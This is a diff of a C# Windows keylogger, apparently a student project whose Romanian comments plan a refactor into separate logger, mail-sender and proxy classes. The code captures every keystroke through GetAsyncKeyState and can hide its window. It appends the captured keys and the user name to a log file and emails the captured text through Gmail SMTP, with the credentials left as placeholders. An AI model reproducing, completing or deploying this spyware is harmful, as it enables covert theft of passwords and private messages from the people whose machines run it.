@@ -12,29 +12,45 @@ using System.IO;
 using System.Net.Mail;
 using System.Net;
 
-namespace Keylogger1
+namespace Keylogger
 {
     public partial class Form1 : Form
     {
+        //TODO
+        // trebuie modificate variabilele sa intelegem ce sunt cu ele la fel si pe interfata.
+        // trimiterea email-ului ar trebui sa se faca doar la o apasare de buton pe buton de interfata sau daca e invizibila interfata, la inceput cand se da init se poate selecta timpul la care sa se trimita un email
+        // si asa setati timer_tick period la timpul selectat de client. cred ca la 1-2 minute pentru a putea fi usor testat.
+        // timerul de scriere a fisierului cred ca trebuie sa ramana la fel.
+        private Proxy _proxy;
+        private MailSender _mailSender;
+        private KeyLogger _keyLogger;
+        // _keyLogger va fi tot o clasa si metodele sale for fi utilizate prin acest atribut. KeyLogger.Start()...KeyLogger.Init() etc cum ganditi voi.
+        // am aplicat sablon proxy ca sa fie unul. nu stiu daca e foarte util dar l-am folosit sa fie un sablon sa respectam cerinta. Ma gandesc la un singleton mai tarziu.
         public Form1()
         {
             InitializeComponent();
+
+
+            _proxy = new Proxy();
+            _mailSender = new MailSender("smtp.gmail.com", 587, "YOUR-EMAIL-1@gmail.com");// email doar de tip gmail.
+            _keyLogger = new KeyLogger();
         }
+        string data = "";
         [DllImport("User32.dll")]
         private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);
 
         [DllImport("User32.dll")]
         private static extern short GetAsyncKeyState(System.Int32 vKey);
         StringBuilder keyBuffer;
-        
-        string data = "";
-        
+
+
+
         void CreateLog(string file)
         {
             try
             {
                 StreamWriter sw = new StreamWriter(file, true);//I used true to append log to file
-                
+
                 sw.Write(keyBuffer.ToString());
                 sw.Write(data.ToString());
                 sw.Close();
@@ -44,6 +60,7 @@ namespace Keylogger1
             {
             }
         }
+
         private void button1_Click(object sender, EventArgs e)
         {
             this.Opacity = 0;
@@ -59,15 +76,14 @@ namespace Keylogger1
             this.Opacity = 0;
         }
         string msg = "";
-        bool capslock, numlock;
+        bool capslock;
+        //Metoda Key_tick trebuie sa ramane aici, apartine de interfata(trebuie modificat sa mearga cu apelurile din KeyLogger class. Adica codul ce tine de logger sa fie in clasa Logger aici sa se faca doar actualizari
+        // Sa fie fiecare modul cu specificul lui.
         private void key_Tick(object sender, EventArgs e)
         {
             capslock = Console.CapsLock;
-            numlock = Console.NumberLock;
-            if (capslock == true)
-            {
-                //button1.Text = "On";
-            }
+            // noi nu ar trebui sa punem textul pe interfata atata timp cat va fi invizibila dupa ce dam start.
+            // ca sa mearga treaba aici ca idee sa fie frumos ma gandesc sa faceti o metoda in KeyLogger in care sa se faca switchul asta urias iar metoda sa returneze string-ul care trebuie adaugat la mesaj aici.
             foreach (System.Int32 i in Enum.GetValues(typeof(Keys))) //Iterate through each key to know whether it was pressed or not
             {
                 if (GetAsyncKeyState(i) == -32767)   //-32767(minimum value) indicates that key was pressed since we last called this function
@@ -293,7 +309,7 @@ namespace Keylogger1
         int ctrl, shift, del,back = 0; int sp; string msg2; char a,ab;
         private void Form1_Load(object sender, EventArgs e)
         {
-            this.Opacity = 0;
+            this.Opacity = 1;
             key.Enabled = true;
             log.Enabled = true;
             notifyIcon1.ShowBalloonTip(5000);
@@ -303,59 +319,10 @@ namespace Keylogger1
             string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
             richTextBox1.Text += userName + "     :    ";
             keyBuffer = new StringBuilder();
-            smtpClient= "smtp.gmail.com";
-            smtpPort = "587";
-            mailfrom= "YOUR-EMAIL-1@gmail.com"; //ONLY GMAIL ALLOWED
 
         }
 
-        string smtpClient, smtpPort, mailfrom;
-
-        public void sendMail1()
-        {
-            try
-            {
-                MailMessage mail = new MailMessage();
-                mail.From = new MailAddress(mailfrom);
-                mail.To.Add(new MailAddress("YOUR-EMAIL-WHERE-YOU-WANT-TO-RECEIVE-@anyMail.com"));
-                mail.Body = richTextBox1.Text;
-
-                SmtpClient Smtp_Client = new SmtpClient("smtp.gmail.com", 587);
-                Smtp_Client.EnableSsl = true;
-                Smtp_Client.Credentials = new NetworkCredential(mailfrom, "YOUR-EMAIL-1-PASSWORD"); ;
-
-                Smtp_Client.SendCompleted += new SendCompletedEventHandler(smtp_SendCompleted);
-                Smtp_Client.SendAsync(mail, null);
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show(ex.ToString());
-            }
-        }
-
-        private void smtp_SendCompleted(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
-        {
-            if (e.Error != null) { }
-            else if (e.Cancelled) { }
-            else
-            { }
-        }
-        private void sendMail()
-        {
-            try
-            {
-                SmtpClient client = new SmtpClient(smtpClient);
-                MailMessage message = new MailMessage(mailfrom, "YOUR-EMAIL-1@gmail.com");
-                message.Body = richTextBox1.Text;
-                message.Subject = "Keylogger";
-                client.Credentials = new System.Net.NetworkCredential(mailfrom, "YOUR-EMAIL-1-PASSWORD");
-                client.Port = Convert.ToInt32(smtpPort);
-                client.Send(message);
-            }
-            catch (Exception ex)
-            {
-            }
-        }
+        
         private void log_Tick(object sender, EventArgs e)
         {
             CreateLog(@"D:\logfilebest.txt");
@@ -370,12 +337,16 @@ namespace Keylogger1
 
         private void timer1_Tick(object sender, EventArgs e)
         {
-           sendMail1();
+            //am nevoie de calea fisierului unde a-ti scris mesajul pentru a folosi sablonul proxy.
+            string path = "test";
+           _mailSender.SendMail(_proxy.GetDocument(path));
         }
 
         private void button3_Click(object sender, EventArgs e)
         {
-            sendMail1();
+            //am nevoie de calea fisierului unde a-ti scris mesajul pentru a folosi sablonul proxy.
+            string path = "test";
+            _mailSender.SendMail(_proxy.GetDocument(path));
         }
     }
 }
